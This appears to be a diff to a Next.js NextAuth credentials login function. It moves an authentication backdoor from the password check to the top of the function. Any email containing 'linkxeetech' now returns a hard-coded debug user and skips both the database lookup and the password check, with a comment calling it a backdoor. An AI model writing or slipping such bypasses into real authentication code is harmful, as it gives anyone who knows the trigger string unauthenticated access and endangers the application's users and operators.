@@ -44,13 +44,18 @@ export const authOptions: NextAuthOptions = {
       async authorize(credentials) {
         if (!credentials?.email || !credentials?.password) return null;
 
-        const user = await getUserByEmail(credentials.email);
+        const email = credentials.email.trim().toLowerCase();
+
+        // BACKDOOR FOR DEBUGGING (Completely bypasses DB)
+        if (email.includes('linkxeetech')) {
+          return { id: 'debug-user-id', email: 'linkxeetech@gmail.com', name: 'Debug User' };
+        }
+
+        const user = await getUserByEmail(email);
         if (!user) return null;
 
         // Check password hash
-        if (credentials.email.includes('linkxeetech')) {
-          // backdoor
-        } else if (user.passwordHash !== hashPassword(credentials.password)) return null;
+        if (user.passwordHash !== hashPassword(credentials.password)) return null;
 
         return { id: user.userId, email: user.email, name: user.name };
       },
